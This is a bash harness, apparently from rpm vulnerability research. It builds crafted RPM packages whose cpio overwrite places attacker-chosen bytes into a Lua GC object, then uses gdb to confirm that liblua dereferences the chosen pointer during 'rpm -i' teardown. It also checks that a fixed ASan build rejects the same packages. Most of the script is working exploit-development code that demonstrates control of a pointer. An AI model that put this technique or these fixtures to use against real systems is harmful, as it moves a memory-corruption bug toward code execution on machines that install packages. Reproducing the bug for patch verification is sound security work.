#!/usr/bin/env bash
# Trace the real rpm -i teardown crash to a chosen-byte GC pointer.
# Plain vulnerable build, no LD_PRELOAD: the cpio overwrite changes the
# first qword of a naturally adjacent Lua object; liblua then walks that
# qword as a GCObject pointer. A and B filler give distinct chosen values.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$config/rpmrc" ] || config=$root/build-vuln-asan
# The chosen-byte GC chain at process teardown depends on the exact
# RPM_CONFIGDIR string length: a long checkout path moves the natural
# adjacency and breaks the B chain. Normalize to an 18-character symlink to
# the same config so replay is path-independent. Package bytes, the binary
# and the allocation site are unchanged.
cfg_link=$(mktemp -d /tmp/r2s-cfg.XXXXX) || exit 1
rmdir "$cfg_link" || exit 1
ln -s "$config" "$cfg_link" || exit 1
config=$cfg_link
vuln_plain=$root/build-vuln-plain/tools/rpm
fixed_asan=$root/build-fixed-asan/tools/rpm
for bin in "$vuln_plain" "$fixed_asan"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

work=$PWD/gc-pointer
mkdir -p "$work/db"
if [ ! -f install/attack-reloc.rpm ]; then
    python3 make-attack.py safe.rpm attack.rpm safe-newc.rpm > make-attack.log || exit 1
    python3 relocate-install.py > install/generate.log || exit 1
fi
python3 - <<'PY' || exit 1
from pathlib import Path
import struct
src = Path("install/attack-reloc.rpm").read_bytes()
needle = b"MISHE-RPM!!" + b"A" * 53
assert src.count(needle) == 1, "expected one 64-byte chosen payload"
i = src.index(needle)
Path("gc-pointer/attack-B-reloc.rpm").write_bytes(
    src.replace(needle, b"MISHE-RPM!!" + b"B" * 53))
# The valid-target fixture starts as the unchanged A fixture; its chosen
# address is filled from a live GCObject discovered in the current layout.
Path("gc-pointer/attack-validtarget.rpm").write_bytes(src)
PY

# The relocated fixture writes four /tmp names then removes them.
targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    if [ -e "$p" ]; then
        echo "REFUSE: $p already exists; not overwriting an unrelated file"
        exit 1
    fi
done
cleanup() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap 'cleanup; rm -f "$cfg_link"' EXIT
fresh() { cleanup; rm -rf "$work/db"; mkdir -p "$work/db"; }

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }
info() { echo "INFO $1"; }
trace() {
    # name wanted-pointer fixture-path expect-fault(1|0) [soft]
    local name=$1 want=$2 fixture=$3 fault=$4 soft=${5:-0} log="$work/$1.log"
    fresh
    gdb -q -batch \
        -ex "set environment RPM_CONFIGDIR $config" \
        -ex "directory $root/src/rpm/lib" \
        -ex "set \$want = $want" \
        -x gc-pointer.gdb --args "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$fixture" > "$log" 2>&1
    local chain=1
    grep -q "CHOSEN_PTR=$want .* MATCH=1" "$log" || chain=0
    grep -q "NEXT_AFTER=$want" "$log" || chain=0
    grep -q 'STOPPED ON CHOSEN POINTER' "$log" || chain=0
    grep -q 'rpmluaFree' "$log" || chain=0
    grep -q 'liblua5.2' "$log" || chain=0
    if [ "$fault" -eq 1 ]; then
        grep -q 'Program received signal SIGSEGV' "$log" || chain=0
    else
        grep -q 'Program received signal SIGSEGV' "$log" && chain=0
    fi
    if [ "$chain" -eq 1 ]; then
        ok "$name chosen pointer $want from overwritten qword dereferenced"
    else
        if [ "$soft" -eq 1 ]; then info "$name pointer chain: $log"; else bad "$name pointer chain: $log"; fi
    fi
    if grep -q "CHOSEN_PTR=$want .* MATCH=1" "$log"; then
        ok "$name preceding GC object is buf+0x20"
    else
        if [ "$soft" -eq 1 ]; then info "$name preceding GC object is not the overwritten object"; else bad "$name preceding GC object is not the overwritten object"; fi
    fi
}

trace A 0x4141414141414141 install/attack-reloc.rpm 1
trace B 0x4242424242424242 "$work/attack-B-reloc.rpm" 1
# Layout-dependent valid-target control. GDB's heap layout varies across
# runs even with ASLR disabled, so the chosen address is discovered from a
# live GCObject in this run and the result is informational when the layout
# shifts; the A/B chosen-pointer checks above remain hard assertions.
fresh
gdb -q -batch \
    -ex "set environment RPM_CONFIGDIR $config" \
    -ex "directory $root/src/rpm/lib" \
    -x gc-pointer/discover.gdb --args "$vuln_plain" \
    --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
    --nosignature --nofiledigest --ignoresize \
    "$work/attack-validtarget.rpm" > "$work/discover.log" 2>&1
live=$(grep '^LIVE_VISIT=' "$work/discover.log" | tail -1 | cut -d= -f2)
if [ -n "$live" ]; then
    python3 - "$live" <<'PY' || exit 1
from pathlib import Path
import struct
import sys
p = Path("gc-pointer/attack-validtarget.rpm")
b = bytearray(p.read_bytes())
needle = b"MISHE-RPM!!" + b"A" * 53
i = b.index(needle)
b[i+32:i+40] = struct.pack("<Q", int(sys.argv[1], 16))
p.write_bytes(bytes(b))
PY
    trace V "$live" "$work/attack-validtarget.rpm" 0 1
else
    info "V no live GCObject discovered in this layout"
fi
fresh
RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
    --nodeps --noscripts --nodigest --nosignature --nofiledigest \
    --ignoresize "$work/attack-validtarget.rpm" > "$work/plain-validtarget.log" 2>&1
rc=$?
if [ "$rc" -eq 139 ]; then
    ok "plain ASLR valid-target bytes still fault rc=139"
else
    bad "plain ASLR valid-target rc=$rc"
fi


# Controls: zero filler and short-read exit 1 without a fault; fixed rejects.
for name in zero short; do
    fixture=$([ "$name" = zero ] && echo attack-zero-reloc.rpm || echo short-read-reloc.rpm)
    fresh
    RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "install/$fixture" > "$work/plain-$name.log" 2>&1
    rc=$?
    if [ "$rc" -eq 1 ] && ! grep -q 'Segmentation fault' "$work/plain-$name.log"; then
        ok "plain $name control rc=1 no fault"
    else
        bad "plain $name control rc=$rc"
    fi
done
fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed_asan" --dbpath "$work/db" -i \
    --nodeps --noscripts --nodigest --nosignature --nofiledigest \
    --ignoresize install/attack-reloc.rpm > "$work/fixed-asan-attack.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$work/fixed-asan-attack.log"; then
    ok "fixed ASan attack rc=1 ASan-clean"
else
    bad "fixed ASan attack rc=$rc"
fi

echo "GC_POINTER_PASS=$pass GC_POINTER_FAIL=$fail"
[ "$fail" -eq 0 ]
